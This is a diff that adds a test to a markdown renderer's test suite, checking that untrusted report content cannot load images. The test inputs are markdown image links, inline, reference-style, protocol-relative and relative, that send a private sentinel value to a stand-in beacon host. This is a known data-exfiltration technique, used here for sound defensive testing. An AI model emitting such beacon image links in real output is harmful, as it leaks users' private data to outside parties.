@@ -82,6 +82,19 @@ describe("MarkdownDocument", () => {
     expect(markup).toContain("&lt;script&gt;");
   });
 
+  it.each([
+    "![Summary](https://untrusted.invalid/beacon?text=PRIVATE_SENTINEL)",
+    "![Summary][image]\n\n[image]: https://untrusted.invalid/beacon?text=PRIVATE_SENTINEL",
+    "![Summary](//untrusted.invalid/beacon?text=PRIVATE_SENTINEL)",
+    "![Summary](./beacon?text=PRIVATE_SENTINEL)",
+  ])("does not load images from untrusted report content: %s", (content) => {
+    const markup = render(content);
+    expect(markup).toContain("Summary");
+    expect(markup).not.toContain("<img");
+    expect(markup).not.toContain("<link");
+    expect(markup).not.toContain("PRIVATE_SENTINEL");
+  });
+
   it("keeps long unbroken values inside the document", () => {
     const markup = render(`${LONG_CONTENT.korean}\n\n${LONG_CONTENT.token}`);
 
